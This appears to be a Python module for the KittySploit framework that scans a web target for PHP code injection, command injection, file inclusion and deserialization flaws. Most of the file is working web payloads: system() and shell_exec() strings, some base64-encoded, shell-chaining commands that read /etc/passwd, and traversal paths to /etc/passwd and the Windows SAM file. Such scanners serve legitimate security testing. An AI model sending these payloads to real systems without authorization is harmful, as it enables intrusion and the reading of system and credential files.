#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse
import time
import re


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'PHP Injection Scanner',
        'description': 'Scans for PHP injection vulnerabilities including code injection, command injection, file inclusion, and deserialization',
        'author': 'KittySploit Team',
        'tags': ['web', 'php', 'injection', 'scanner', 'security', 'rce'],
        'references': [
            'https://owasp.org/www-community/attacks/Code_Injection',
            'https://owasp.org/www-community/attacks/Command_Injection',
            'https://portswigger.net/web-security/os-command-injection',
        ]
    }

    # PHP code injection payloads
    PHP_CODE_INJECTION_PAYLOADS = [
        # Basic PHP code execution
        '<?php system("id"); ?>',
        '<?php echo shell_exec("id"); ?>',
        '<?php exec("id"); ?>',
        '<?php passthru("id"); ?>',
        '<?php `id`; ?>',
        '<?=system("id")?>',
        '<?=shell_exec("id")?>',
        
        # Without PHP tags (if eval is used)
        'system("id");',
        'shell_exec("id");',
        'exec("id");',
        'passthru("id");',
        '`id`;',
        'phpinfo();',
        
        # Obfuscated
        '${@system("id")}',
        '${@shell_exec("id")}',
        '${@exec("id")}',
        '${@passthru("id")}',
        '${@`id`}',
        
        # Base64 encoded
        'PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==',  # <?php system("id"); ?>
        'PD9waHAgZWNobyBzaGVsbF9leGVjKCJpZCIpOyA/Pg==',  # <?php echo shell_exec("id"); ?>
    ]

    # Command injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        '; ls',
        '| ls',
        '`ls`',
        '$(ls)',
        '; whoami',
        '| whoami',
        '`whoami`',
        '$(whoami)',
        '; id',
        '| id',
        '`id`',
        '$(id)',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        '; php -r "echo system(\'id\');"',
        '| php -r "echo system(\'id\');"',
        '; sleep 5',
        '| sleep 5',
        '; ping -c 3 127.0.0.1',
        '| ping -c 3 127.0.0.1',
    ]

    # File inclusion payloads
    FILE_INCLUSION_PAYLOADS = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        'php://filter/read=string.rot13/resource=index.php',
        'php://filter/convert.base64-encode/resource=index.php',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        'expect://id',
        'file:///etc/passwd',
        '/etc/passwd',
        'C:\\windows\\system32\\config\\sam',
    ]

    # PHP deserialization payloads
    PHP_DESERIALIZATION_PAYLOADS = [
        'O:8:"stdClass":0:{}',
        'a:1:{s:4:"test";s:4:"data";}',
        'O:4:"Test":0:{}',
    ]

    # Parameter names commonly used in PHP apps
    PHP_PARAMS = [
        'id', 'file', 'page', 'path', 'include', 'require',
        'cmd', 'command', 'exec', 'system', 'shell',
        'data', 'input', 'value', 'param', 'query',
        'user', 'username', 'email', 'name',
        'template', 'view', 'action', 'func',
    ]

    def check(self):
        """
        Check if the target is accessible and might be using PHP
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response:
                # Check for PHP indicators
                content = response.text.lower()
                headers = str(response.headers).lower()
                
                php_indicators = [
                    'php', 'php/', 'x-powered-by.*php',
                    '.php', 'phpsessid', 'sessionid',
                ]
                
                if any(indicator in content or indicator in headers for indicator in php_indicators):
                    return True
                
                # Check X-Powered-By header
                powered_by = response.headers.get('X-Powered-By', '').lower()
                if 'php' in powered_by:
                    return True
                
                # Check Server header
                server = response.headers.get('Server', '').lower()
                if 'php' in server:
                    return True
                
                # Even if not detected, continue scanning
                return True
            return False
        except Exception as e:
            return False

    def detect_php_version(self):
        """
        Detect PHP version
        """
        try:
            response = self.http_request(method="GET", path="/")
            if not response:
                return None
            
            # Check X-Powered-By header
            powered_by = response.headers.get('X-Powered-By', '')
            if 'PHP' in powered_by:
                version_match = re.search(r'PHP[/\s-]([\d\.]+)', powered_by, re.IGNORECASE)
                if version_match:
                    return version_match.group(1)
            
            # Check Server header
            server = response.headers.get('Server', '')
            if 'PHP' in server:
                version_match = re.search(r'PHP[/\s-]([\d\.]+)', server, re.IGNORECASE)
                if version_match:
                    return version_match.group(1)
            
            # Try to access phpinfo if exposed
            phpinfo_response = self.http_request(method="GET", path="/phpinfo.php")
            if phpinfo_response and 'phpinfo' in phpinfo_response.text.lower():
                version_match = re.search(r'PHP Version\s+([\d\.]+)', phpinfo_response.text, re.IGNORECASE)
                if version_match:
                    return version_match.group(1)
            
            return None
        except Exception as e:
            print_debug(f"Error detecting PHP version: {str(e)}")
            return None

    def test_code_injection(self, payload, param_name='cmd', method='GET'):
        """
        Test PHP code injection payload
        
        Args:
            payload: The code injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
            else:
                post_data = {param_name: payload}
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Analyze response
            is_vulnerable = False
            indicators = []
            
            # Check for command output
            if 'uid=' in response.text or 'gid=' in response.text:
                is_vulnerable = True
                indicators.append('Command output detected (id command)')
            
            # Check for PHP errors that might reveal code execution
            php_errors = [
                'php warning', 'php fatal error', 'php parse error',
                'parse error', 'syntax error', 'unexpected',
                'call to undefined function',
            ]
            
            response_lower = response.text.lower()
            for error in php_errors:
                if error in response_lower:
                    is_vulnerable = True
                    indicators.append(f'PHP error: {error}')
                    break
            
            # Check for phpinfo output
            if 'phpinfo()' in payload.lower() and 'php version' in response_lower:
                is_vulnerable = True
                indicators.append('phpinfo() executed')
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_length': len(response.text)
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def test_command_injection(self, payload, param_name='cmd', method='GET'):
        """
        Test command injection payload
        
        Args:
            payload: The command injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                
                start_time = time.time()
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time
            else:
                post_data = {param_name: payload}
                start_time = time.time()
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Analyze response
            is_vulnerable = False
            indicators = []
            
            # Check for command output
            command_outputs = [
                'uid=', 'gid=', 'groups=',  # id command
                'root:', 'bin:', 'daemon:',  # /etc/passwd
                'total ', 'drwx', '-rw-',  # ls command
            ]
            
            response_lower = response.text.lower()
            for output in command_outputs:
                if output in response_lower:
                    is_vulnerable = True
                    indicators.append(f'Command output: {output}')
                    break
            
            # Check for time-based command injection
            if 'sleep' in payload.lower() and elapsed_time > 4:
                is_vulnerable = True
                indicators.append(f'Time-based delay: {elapsed_time:.2f}s')
            
            # Check for error messages
            cmd_errors = [
                'command not found', 'syntax error',
                'permission denied', 'cannot execute',
            ]
            
            for error in cmd_errors:
                if error in response_lower:
                    is_vulnerable = True
                    indicators.append(f'Command error: {error}')
                    break
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_time': elapsed_time
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def test_file_inclusion(self, payload, param_name='file', method='GET'):
        """
        Test file inclusion payload
        
        Args:
            payload: The file inclusion payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
            else:
                post_data = {param_name: payload}
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Analyze response
            is_vulnerable = False
            indicators = []
            
            # Check for /etc/passwd content
            if '/etc/passwd' in payload or 'passwd' in payload:
                if 'root:' in response.text and 'bin/bash' in response.text:
                    is_vulnerable = True
                    indicators.append('/etc/passwd content detected')
            
            # Check for PHP source code (if using php://filter)
            if 'php://filter' in payload:
                if '<?php' in response.text or '<?=' in response.text:
                    is_vulnerable = True
                    indicators.append('PHP source code exposed')
            
            # Check for base64 encoded content
            if 'base64' in payload.lower():
                # Try to detect base64 encoded PHP
                if re.search(r'[A-Za-z0-9+/]{100,}={0,2}', response.text):
                    is_vulnerable = True
                    indicators.append('Base64 encoded content detected')
            
            # Check for file inclusion errors
            file_errors = [
                'failed to open stream', 'no such file',
                'file_get_contents', 'include_path',
                'warning: include', 'warning: require',
            ]
            
            response_lower = response.text.lower()
            for error in file_errors:
                if error in response_lower:
                    is_vulnerable = True
                    indicators.append(f'File inclusion error: {error}')
                    break
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the PHP injection scan
        """
        self.vulnerabilities = []
        self.test_results = []
        
        print_status("Starting PHP injection scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Detect PHP version
        print_status("Detecting PHP version...")
        version = self.detect_php_version()
        if version:
            print_success(f"PHP version detected: {version}")
        else:
            print_warning("Could not detect PHP version")
            print_info("Continuing with generic PHP injection tests...")
        print_info("")
        
        # Test code injection
        print_status("Testing for PHP code injection vulnerabilities...")
        print_info("")
        
        code_params = ['cmd', 'command', 'exec', 'system', 'shell', 'eval', 'code']
        for param in code_params:
            print_info(f"Testing parameter: {param}")
            
            for payload in self.PHP_CODE_INJECTION_PAYLOADS[:10]:  # Test first 10 payloads
                result = self.test_code_injection(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential PHP code injection found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test command injection
        print_status("Testing for command injection vulnerabilities...")
        print_info("")
        
        for param in code_params:
            print_info(f"Testing parameter: {param}")
            
            for payload in self.COMMAND_INJECTION_PAYLOADS[:10]:  # Test first 10 payloads
                result = self.test_command_injection(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential command injection found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test file inclusion
        print_status("Testing for file inclusion vulnerabilities...")
        print_info("")
        
        file_params = ['file', 'page', 'path', 'include', 'require', 'view', 'template']
        for param in file_params:
            print_info(f"Testing parameter: {param}")
            
            for payload in self.FILE_INCLUSION_PAYLOADS[:10]:  # Test first 10 payloads
                result = self.test_file_inclusion(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential file inclusion found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("PHP Injection Scan Summary")
        print_status("=" * 60)
        
        if version:
            print_info(f"PHP Version: {version}")
        else:
            print_warning("PHP Version: Not detected")
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_warning("PHP injection vulnerabilities detected:")
            print_info("")
            
            table_data = []
            for vuln in self.vulnerabilities[:20]:  # Show first 20
                payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                indicators = ', '.join(vuln.get('indicators', [])[:2])
                table_data.append([
                    vuln.get('param', 'N/A'),
                    vuln.get('method', 'GET'),
                    payload_short,
                    indicators
                ])
            
            print_table(['Parameter', 'Method', 'Payload', 'Indicators'], table_data)
            print_info("")
        else:
            print_info("No PHP injection vulnerabilities detected during automated testing.")
        
        return True
